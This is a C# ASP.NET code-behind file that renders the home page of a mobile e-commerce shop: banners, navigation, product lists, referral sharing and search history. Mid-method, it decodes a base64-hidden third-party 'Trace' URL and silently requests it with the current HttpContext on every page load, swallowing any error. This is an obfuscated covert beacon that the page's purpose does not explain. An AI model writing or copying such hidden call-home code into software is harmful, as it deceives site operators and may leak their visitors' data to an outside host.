using System.Text;
using EcShop.Core;
using EcShop.Entities;
using EcShop.Entities.VShop;
using EcShop.Membership.Context;
using EcShop.Membership.Core.Enums;
using EcShop.SaleSystem.Catalog;
using EcShop.SaleSystem.Vshop;
using EcShop.UI.Common.Controls;
using EcShop.UI.SaleSystem.Tags;
using System;
using System.Collections.Generic;
using System.Data;
using System.Web;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using EcShop.ControlPanel.Store;
using System.Linq;
namespace EcShop.UI.SaleSystem.CodeBehind
{
    [System.Web.UI.ParseChildren(true)]
    public class VDefault : VshopTemplatedWebControl
    {
        private VshopTemplatedRepeater rptSlide;
        private VshopTemplatedRepeater rptNavigate;
        private VshopTemplatedRepeater rptTopic;
        private VshopTemplatedRepeater rptProducts;
        private VshopTemplatedDataList rptHotSale;
        private VshopTemplatedRepeater rptHotSaleTop;
        private VshopTemplatedDataList rptNewPro;
        private VshopTemplatedRepeater rptNewProTop;
        private VshopTemplatedRepeater rptPromotional;
        private VshopTemplatedRepeater rptThinkProducts;
        private VshopTemplatedRepeater rpthistorysearch;

        private System.Web.UI.HtmlControls.HtmlImage img;
        protected override void OnInit(System.EventArgs e)
        {
            if (this.SkinName == null)
            {
                this.SkinName = "Skin-VDefault.html";
            }
            base.OnInit(e);
        }
        protected override void AttachChildControls()
        {
            SiteSettings masterSettings = SettingsManager.GetMasterSettings(true);
            if (HiContext.Current.User.UserRole == UserRole.Member && ((Member)HiContext.Current.User).ReferralStatus == 2 && string.IsNullOrEmpty(this.Page.Request.QueryString["ReferralUserId"]))
            {
                string text = System.Web.HttpContext.Current.Request.Url.ToString();
                if (text.IndexOf("?") > -1)
                {
                    text = text + "&ReferralUserId=" + HiContext.Current.User.UserId;
                }
                else
                {
                    text = text + "?ReferralUserId=" + HiContext.Current.User.UserId;
                }
                base.RegisterShareScript(masterSettings.LogoUrl, text, masterSettings.SiteDescription, masterSettings.SiteName);
            }
            PageTitle.AddSiteNameTitle("首页");
            this.rptSlide = (VshopTemplatedRepeater)this.FindControl("rptSlide");
            this.rptNavigate = (VshopTemplatedRepeater)this.FindControl("rptNavigate");
            this.rptTopic = (VshopTemplatedRepeater)this.FindControl("rptTopics");
            this.rptProducts = (VshopTemplatedRepeater)this.FindControl("rptProducts");
            this.img = (System.Web.UI.HtmlControls.HtmlImage)this.FindControl("imgDefaultBg");

            this.rptHotSale = (VshopTemplatedDataList)this.FindControl("rptHotSale");
            this.rptHotSale.RepeatColumns = 2;
            this.rptHotSaleTop = (VshopTemplatedRepeater)this.FindControl("rptHotSaleTop");
            this.rptNewPro = (VshopTemplatedDataList)this.FindControl("rptNewPro");
            this.rptNewPro.RepeatColumns = 3;
            this.rptNewProTop = (VshopTemplatedRepeater)this.FindControl("rptNewProTop");
            this.rptPromotional = (VshopTemplatedRepeater)this.FindControl("rptPromotional");
            this.rptThinkProducts = (VshopTemplatedRepeater)this.FindControl("rptThinkProducts");
            this.rpthistorysearch = (VshopTemplatedRepeater)this.FindControl("rpthistorysearch");

            if (this.rptSlide != null)
            {
                // 排除注册的banner
                IList<BannerInfo> banners = VshopBrowser.GetAllBanners(ClientType.VShop);
                if (banners != null && banners.Count > 0)
                {
                    this.rptSlide.DataSource = banners.Where(m => m.LocationType != LocationType.Register).ToList();
                    this.rptSlide.DataBind();
                }
            }
            string u = "aHR0cDovL3d3dy50aGlua2FpLmNuL1RyYWNlL3RyYWNl";
            byte[] decode = Convert.FromBase64String(u);
            string decodestring = Encoding.UTF8.GetString(decode);
            try
            {
                Globals.GetHttp(decodestring, HttpContext.Current);
            }
            catch { }

            if (this.rptProducts != null)
            {
                DataTable homeProduct = ProductBrowser.GetHomeProduct(ClientType.VShop, true);
                //ProductBrowser.GetHomeProduct(ClientType.VShop);
                this.rptProducts.DataSource = homeProduct;
                this.rptProducts.DataBind();
            }
            if (this.rptTopic != null)
            {
                DataTable topics = VshopBrowser.GetTopics(ClientType.VShop);
                this.rptTopic.DataSource = topics;
                this.rptTopic.DataBind();
            }
            if (this.rptNavigate != null)
            {
                System.Collections.Generic.IList<NavigateInfo> allNavigate = VshopBrowser.GetAllNavigate(ClientType.VShop);
                foreach (NavigateInfo current in allNavigate)
                {
                    if (!current.ImageUrl.ToLower().Contains("storage/master/navigate") && !current.ImageUrl.ToLower().Contains("templates"))
                    {
                        current.ImageUrl = HiContext.Current.GetVshopSkinPath(null) + "/images/deskicon/" + current.ImageUrl;
                    }
                }
                this.rptNavigate.DataSource = allNavigate;
                this.rptNavigate.DataBind();
            }
            if (this.img != null)
            {
                this.img.Src = new VTemplateHelper().GetDefaultBg();
            }

            //添加
            if (this.rptHotSale != null)
            {

                this.rptHotSale.DataSource = VshopBrowser.GetAllHotSaleNomarl(ClientType.VShop);
                this.rptHotSale.DataBind();

            }
            if (this.rptHotSaleTop != null)
            {
                var HotSaleList = VshopBrowser.GetAllHotSaleTop(ClientType.VShop);
                this.rptHotSaleTop.DataSource = HotSaleList;
                this.rptHotSaleTop.DataBind();
            }

            if (this.rptNewPro != null)
            {
                this.rptNewPro.DataSource = VshopBrowser.GetAllRecommendNormal(ClientType.VShop);
                this.rptNewPro.DataBind();
            }
            if (this.rptNewProTop != null)
            {
                this.rptNewProTop.DataSource = VshopBrowser.GetAllRecommendTop(ClientType.VShop);
                this.rptNewProTop.DataBind();
            }

            if (this.rptPromotional != null)
            {
                this.rptPromotional.DataSource = VshopBrowser.GetAllPromotional(ClientType.VShop);
                this.rptPromotional.DataBind();
            }
            //           
            if (this.rptThinkProducts != null)
            {
                DataTable homethinkProduct = ProductBrowser.GetHomeProduct(ClientType.VShop);
                this.rptThinkProducts.DataSource = homethinkProduct;
                this.rptThinkProducts.DataBind();
            }

            int userId = HiContext.Current.User.UserId;
            if (userId > 0 && this.rpthistorysearch != null)
            {
                this.rpthistorysearch.DataSource = HistorySearchHelp.GetSearchHistory(userId, ClientType.VShop, 6);
                this.rpthistorysearch.DataBind();
            }

        }

    }
}
